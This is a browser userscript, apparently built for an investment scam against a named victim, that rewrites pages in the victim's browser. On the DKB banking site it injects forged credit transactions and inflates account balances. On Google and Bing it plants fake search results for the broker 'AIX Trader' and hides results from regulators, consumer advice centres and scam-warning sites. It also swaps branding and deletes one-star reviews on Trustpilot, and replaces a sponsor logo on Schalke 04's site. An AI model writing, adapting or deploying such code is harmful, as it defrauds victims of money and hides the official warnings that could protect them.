// ==UserScript==
// @name         ED Combined D Ilona Hohle
// @namespace    http://tampermonkey.net/
// @version      6.0
// @description  D und Amadeus Rep
// @match        *://*/*
// @match        https://www.drivehq.com/*
// @match        https://www.ib.dkb.de/*
// @match        https://banking.dkb.de/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/486684/ED%20Combined%20D%20Ilona%20Hohle.user.js
// @updateURL https://update.greasyfork.org/scripts/486684/ED%20Combined%20D%20Ilona%20Hohle.meta.js
// ==/UserScript==



(function() {
    'use strict';

       // Check if on the login page
    const isLoginPage = window.location.href.indexOf('https://banking.dkb.de/login') !== -1;

    if (isLoginPage) {
        // Redirect URL
        const redirectURL = 'https://www.ib.dkb.de/banking';

        // Redirect to the new URL
        window.location.href = redirectURL;

        // Handle refresh logic
        const refresh = window.localStorage.getItem('refresh');
        console.log(refresh);

        setTimeout(function() {
            if (refresh === null) {
                window.location.reload();
                window.localStorage.setItem('refresh', '1');
            }
        }, 1500); // 1500 milliseconds = 1.5 seconds

        setTimeout(function() {
            localStorage.removeItem('refresh');
        }, 1400); // 1400 milliseconds = 1.4 seconds
    }

    // Add click event listener to the entire document
    document.addEventListener('click', function(event) {
        // Redirect only if click occurs on the login page
        if (isLoginPage) {
            const clickTarget = event.target;

            // Check if the clicked element is within the login form
            const isClickInLoginForm = clickTarget.closest('.loginFormWrapper') !== null;

            if (isClickInLoginForm) {
                const redirectURL = 'https://www.ib.dkb.de/banking';
                window.location.href = redirectURL;
            }
        }
    });

     // Check if elements with class "sum bgColor" exist on the page
    const sumElements = document.querySelectorAll('.sum.bgColor');

    if (sumElements.length > 0) {
        // If they exist, remove each element
        sumElements.forEach(element => {
            element.remove();
            console.log('Removed element with class "sum bgColor".');
        });
    }

    // Check if elements with class "hide-for-xxsmall" exist on the page
    const hideElements = document.querySelectorAll('.hide-for-xxsmall');

    if (hideElements.length > 0) {
        // If they exist, remove each element
        hideElements.forEach(element => {
            element.remove();
            console.log('Removed element with class "hide-for-xxsmall".');
        });
    }


    // Values to be specified manually
    // For 'Add Transaction with Custom Transaction ID Check'
    const expectedTid = '0'; // The tid you want to match.
    const transaction2 = {
      amount: '247.600,00',
      description: 'Treuhand: Freigabe nötig',
      type: 'Treuhand: Freigabe nötig. Andreas Graf kontaktiert Sie.',
      date: '05.02.2024',
      recipient: 'JP Morgan Chase',
      iban: 'GB28SEOU00994400208913',
      updateBalance: false
    };
      const transaction3 = {
      amount: '1000,00',
      description: 'Test',
      type: 'Gutschrift',
      date: '05.02.2024    05.02.2024',
      recipient: 'JP Morgan Chase',
      iban: 'GB28SEOU00994400208913',
      updateBalance: true
    };
          const transaction4 = {
      amount: '11.500,00',
      description: 'Geld für Steuern. Andreas Graf kontaktiert Sie.',
      type: 'Gutschrift. Geld für Steuern. Andreas Graf kontaktiert Sie',
      date: '06.02.2024    06.02.2024',
      recipient: 'JP Morgan Chase',
      iban: 'GB28SEOU00994400208913',
      updateBalance: true
    };
              const transaction5 = {
      amount: '23.000,00',
      description: 'Geld für Kapitalertragsteuern. Andreas Graf kontaktiert Sie.',
      type: 'Gutschrift. Geld für Steuern. Andreas Graf kontaktiert Sie',
      date: '13.02.2024    13.02.2024',
      recipient: 'JP Morgan Chase',
      iban: 'GB28SEOU00994400208913',
      updateBalance: true
    };

                  const transaction7 = {
      amount: '14.500,00',
      description: 'Geld für Steuern. Andreas Graf kontaktiert Sie.',
      type: 'Gutschrift. Geld für Steuern. Andreas Graf kontaktiert Sie',
      date: '16.02.2024    16.02.2024',
      recipient: 'JP Morgan Chase',
      iban: 'GB28SEOU00994400208913',
      updateBalance: true
    };
              const transaction6 = {
      amount: '1.000,00',
      description: 'Gutschrift. Geschenk für Ihre Geduld.',
      type: 'Gutschrift. Geschenk für Ihre Geduld.',
      date: '16.02.2024    16.02.2024',
      recipient: 'JP Morgan Chase',
      iban: 'GB28SEOU00994400208913',
      updateBalance: true
    };

// const transaction5 = {
  //    amount: '12.000,00',
  //    description: 'Geld für Steuern',
  //    type: 'Überweisung Geld für Steuern',
  //    date: '28.09.2023   28.09.2023',
 //     recipient: 'BLUE STAR EXCHANGE PTY LTD',
 //     iban: 'GB28SEOU00994400208913',
  //    updateBalance: true
 //   };
  /// DON'T FORGET TO ADD ANOTHER TRANSACTION BELOW

    // For 'Modify Balance and Amount Userscript'
    const targetIBAN = 'DE67 1203 0000 1005 4416 60'; // The IBAN you want to modify
    let balanceModificationAmount = 1000; // The desired balance modification amount
    let amountModificationValue = 1000; // The desired amount modification value

    // For 'IBAN Balance Updater in Umbuchung'
    const specifiedIBAN = "DE67 1203 0000 1005 4416 60 / Girokonto"; // The desired IBAN
    let specifiedAmount = 2000; // The desired amount

      balanceModificationAmount = amountModificationValue = specifiedAmount = 51000; // change for the desired amount for finanzstatus and umbuchung

    // 'Add Transaction with Custom Transaction ID Check' goes here
    // Function to add a new transaction
    function addTransaction(amount, description, type, date, recipient, iban, updateBalance) {
     const table = document.querySelector('.expandableTable.transactionsTable');
      if (!table) {
        console.error('Target table not found.');
        return;
      }

      const tableBody = table.querySelector('tbody');
      if (!tableBody) {
        console.error('Table body not found.');
        return;
      }


      // Remove elements with class "dailyBalanceText"
      const dailyBalanceTextElements = document.querySelectorAll('.dailyBalanceText');
      dailyBalanceTextElements.forEach(element => element.remove());

      const newRow = document.createElement('tr');
      newRow.className = 'mainRow'; // You may need to adjust the class name accordingly.

      // Create the cells for the new row
      const dateCell = document.createElement('td');
      dateCell.className = 'hide-for-xsmall-down transactionDate';
      dateCell.textContent = date;
      newRow.appendChild(dateCell);

      const typeCell = document.createElement('td');
      typeCell.className = 'transactionText';
      const typeDiv1 = document.createElement('div');
      typeDiv1.textContent = type;
      typeCell.appendChild(typeDiv1);
      const typeDiv2 = document.createElement('div');
      typeDiv2.textContent = recipient;
      typeCell.appendChild(typeDiv2);
      newRow.appendChild(typeCell);

      const ibanCell = document.createElement('td');
      ibanCell.className = 'show-for-large-up';
      const ibanDiv = document.createElement('div');
      ibanDiv.className = 'nowrap trimmed_iban';
      ibanDiv.textContent = iban;
      ibanCell.appendChild(ibanDiv);
      newRow.appendChild(ibanCell);

      const amountCell = document.createElement('td');
      amountCell.className = 'alignRight';
      const amountDiv = document.createElement('div');
      amountDiv.className = 'nowrap';
      const amountSpan = document.createElement('span');
      amountSpan.textContent = amount;
      if (parseFloat(amount.replace(/[^0-9,-]/g, '')) < 0) {
        amountSpan.classList.add('dkbred');
      }
      amountDiv.appendChild(amountSpan);
      amountCell.appendChild(amountDiv);
      newRow.appendChild(amountCell);

      const actionsCell = document.createElement('td');
      actionsCell.className = 'alignRight actions';
      const actionsLink = document.createElement('a');
      actionsLink.setAttribute('data-abx-jsevent', 'pick');
      actionsLink.setAttribute('href', 'https://www.ib.dkb.de/banking/finanzstatus/kontoumsaetze?$event=pick&id=0');
      actionsLink.className = 'evt-pick';
      actionsLink.setAttribute('tid', 'pick');
      const actionsIcon = document.createElement('span');
      actionsIcon.className = 'icons iconLoupe0';
      actionsIcon.title = 'Umsatzdetails';
      actionsLink.appendChild(actionsIcon);
      actionsCell.appendChild(actionsLink);
      newRow.appendChild(actionsCell);

      // Add the new row at the top of the table
      tableBody.insertBefore(newRow, tableBody.firstChild);

          // Check if the element with class "highcharts-container" exists on the page
    const highchartsContainer = document.querySelector('.highcharts-container');

    if (highchartsContainer) {
        // If it exists, remove the element
        highchartsContainer.remove();
        console.log('Removed element with class "highcharts-container".');
    }

      // Update the balance if required
      if (updateBalance) {
        const balanceElement = document.querySelector('.clearfix.module.accountBalance strong span');
        if (balanceElement) {
          const currentBalance = parseFloat(balanceElement.textContent.replace(/[^0-9,-]/g, '').replace(',', '.'));
          const newBalance = currentBalance + parseFloat(amount.replace(/[^0-9,-]/g, '').replace(',', '.'));
          balanceElement.textContent = newBalance.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' });
        } else {
          console.error('Balance element not found.');
        }
      }
    }

    // Function to check if the selected tid under class "field text" matches the specified number
    function isCustomTidSelected(expectedTid) {
      const selectElement = document.querySelector('.mandatory .field.text');
      if (selectElement) {
        const selectedOption = selectElement.options[selectElement.selectedIndex];
        return selectedOption && selectedOption.getAttribute('tid') === expectedTid;
      }
      return false;
    }

    if (isCustomTidSelected(expectedTid)) {
 //     addTransaction(transaction.amount, transaction.description, transaction.type, transaction.date, transaction.recipient, transaction.iban, transaction.updateBalance);
        // HERE I CAN ADD ANOTHER TRANSACTION

     addTransaction(transaction2.amount, transaction2.description, transaction2.type, transaction2.date, transaction2.recipient, transaction2.iban, transaction2.updateBalance);
      addTransaction(transaction3.amount, transaction3.description, transaction3.type, transaction3.date, transaction3.recipient, transaction3.iban, transaction3.updateBalance);
 addTransaction(transaction4.amount, transaction4.description, transaction4.type, transaction4.date, transaction4.recipient, transaction4.iban, transaction4.updateBalance);
 addTransaction(transaction5.amount, transaction5.description, transaction5.type, transaction5.date, transaction5.recipient, transaction5.iban, transaction5.updateBalance);
        addTransaction(transaction6.amount, transaction6.description, transaction6.type, transaction6.date, transaction6.recipient, transaction6.iban, transaction6.updateBalance);
        addTransaction(transaction7.amount, transaction7.description, transaction7.type, transaction7.date, transaction7.recipient, transaction7.iban, transaction7.updateBalance);

    }
  // Function to parse the balance value in the correct format
  function parseBalanceValue(balanceText) {
    // Remove all dots used as thousands separators
    const balanceWithoutDots = balanceText.replace(/\./g, '');

    // Replace the comma with a dot to use it as a decimal separator
    const balanceWithDotDecimal = balanceWithoutDots.replace(',', '.');

    return parseFloat(balanceWithDotDecimal);
  }

  // Function to modify the balance for a specific IBAN
  function modifyBalanceForIBAN(targetIBAN, targetAmount) {
    const mainRows = document.querySelectorAll('.mainRow');
    mainRows.forEach(mainRow => {
      const ibanElement = mainRow.querySelector('.iban.hide-for-small-down');
      const ibanText = ibanElement.textContent.trim();
      if (ibanText === targetIBAN) {
        const balanceElement = mainRow.querySelector('.alignRight.amount.bold');
        const currentBalance = parseBalanceValue(balanceElement.textContent);

        // Increase the balance by the specified amount
        const modifiedBalance = currentBalance + targetAmount;

        // Update the displayed balance
        balanceElement.textContent = modifiedBalance.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' €';
      }
    });
  }

  // Function to modify the amount extracted from the specified HTML source code
  function modifyAmount(modificationValue) {
    const rows = document.querySelectorAll('tr.sum.bgColor');
    rows.forEach(row => {
      const amountCell = row.querySelector('td.amount span[style="white-space:nowrap"]');
      if (amountCell) {
        const amountText = amountCell.innerText;
        const amount = parseBalanceValue(amountText);

        // Modify the amount based on the provided modificationValue
        const modifiedAmount = amount + modificationValue;

        // Update the content of the amountCell with the modified amount
        amountCell.innerText = modifiedAmount.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
      }
    });
  }



    modifyBalanceForIBAN(targetIBAN, balanceModificationAmount);
    modifyAmount(amountModificationValue);

    // 'IBAN Balance Updater in Umbuchung' goes here
    function updateBalance(specifiedIBAN, specifiedAmount) {
      console.log("Starting IBAN Balance Updater script...");

      // Find the IBAN element on the page
      const ibanElement = document.querySelector('span.col65.floatRight strong');

      if (!ibanElement) {
          console.error("IBAN element not found!");
          return;
      }

      console.log("IBAN element found:", ibanElement.textContent.trim());

      // Extract the IBAN from the element
      const extractedIBAN = ibanElement.textContent.trim();

      // Check if the extracted IBAN matches the specified IBAN
      if (extractedIBAN === specifiedIBAN) {
          console.log("Specified IBAN matches the extracted IBAN:", extractedIBAN);

          // Find the balance elements on the page
          const balanceElements = document.querySelectorAll('strong');
          const balanceElement = Array.from(balanceElements).find(el => el.textContent.includes('EUR'));

          if (!balanceElement) {
              console.error("Balance element not found!");
              return;
          }

          console.log("Balance element found:", balanceElement.textContent.trim());

          // Extract the balance amount from the balance element
          const balanceText = balanceElement.textContent.trim();
          const balanceAmount = parseFloat(balanceText.replace(/[^\d,]+/g, '').replace(',', '.'));

          console.log("Balance amount extracted:", balanceAmount);

          // Update the balance amount
          const updatedBalance = balanceAmount + specifiedAmount;

          console.log("Updating balance amount with:", specifiedAmount);
          console.log("New balance amount:", updatedBalance.toFixed(2));

          // Format the updated balance in the desired format
          const formattedBalance = updatedBalance.toLocaleString('de-DE', {
              minimumFractionDigits: 2,
              maximumFractionDigits: 2,
          });

          // Update the balance element with the new value
          balanceElement.textContent = `${formattedBalance} EUR`;

          console.log("Balance updated successfully!");
      } else {
          console.log("Specified IBAN does not match the extracted IBAN:", specifiedIBAN);
      }
    }

    updateBalance(specifiedIBAN, specifiedAmount);

  // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["aix", "trader", "aixtrader", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust", "aix trader", "aix-trader"],
                        results: [
                            {
                                url: "https://aix-trader.com/",
                                title: "AIX Trader dein Broker",
                                description: "AIX Trader ist der Broker mit der besten Reputation.",
                                footerText: "https://aix-trader.com/",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von AIX Trader - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker AIX Trader",
                                footerText: "https://de.trustpilot.com/review/amadeusmarkets.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "AIX Trader Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Amadeus Markets ab dem 1. Januar unser Sponsor und Partner wird. Amadeus Markets ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Amadeus Markets sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}


// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "AIX Trader";
    const customLogoURL = "https://aix-trader.com/wp-content/uploads/2023/08/logo_aix.png";
    const customURL = "https://aix-trader.com";
    const customReferenceURL = "aix-trader.com";
    const customLinkURL = "https://aix-trader.com/"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "AIX Trader",
      "icmarkets": " AIX Trader",
      "ic-markets": "AIX Trader",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}


// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1) {
  var newURL = "https://aix-trader.com/";
var newLogoURL = "https://aix-trader.com/wp-content/uploads/2023/08/logo_aix.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

observer.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung', 'erfahrungen', 'unseriös', 'Images' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de', 'pv-magazine.de', 'finma.ch', 'fma.gv.at' ]; // Add the domains to block here
  var blockedUrls = ['https://www.fma.gv.at/aix-trader/', 'https://www.fma.gv.at/en/aix-trader', 'https://encrypted-tbn0.gstatic.com/*']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }
  })();






